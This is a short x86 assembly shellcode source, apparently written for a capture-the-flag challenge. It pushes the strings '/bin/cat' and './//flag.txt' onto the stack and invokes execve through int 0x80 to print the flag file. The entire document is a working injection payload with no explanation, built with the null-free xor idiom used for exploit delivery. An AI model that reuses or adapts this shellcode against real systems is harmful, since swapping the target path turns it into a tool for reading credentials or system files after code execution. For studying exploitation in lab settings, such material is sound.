# /bin/cat = '7461632f6e69622f'
# './//flag.txt' = '7478742e67616c662f2f2f2e'

.text
.global _start

_start:
        xorl %eax, %eax

        # './//flag.txt'
        pushl %eax
        pushl $0x7478742e
        pushl $0x67616c66
        pushl $0x2f2f2f2e
        movl %esp, %ecx

         #'/bin/cat'
        pushl %eax
        pushl $0x7461632f
        pushl $0x6e69622f

        # char* filename = '/bin/cat'
        movl %esp, %ebx

        # char* envp[]
        pushl %eax
        movl %esp, %edx

        # char* argv[]
        pushl %ecx
        pushl %ebx
        movl %esp, %ecx

        movl $0xb, %eax
        int $0x80
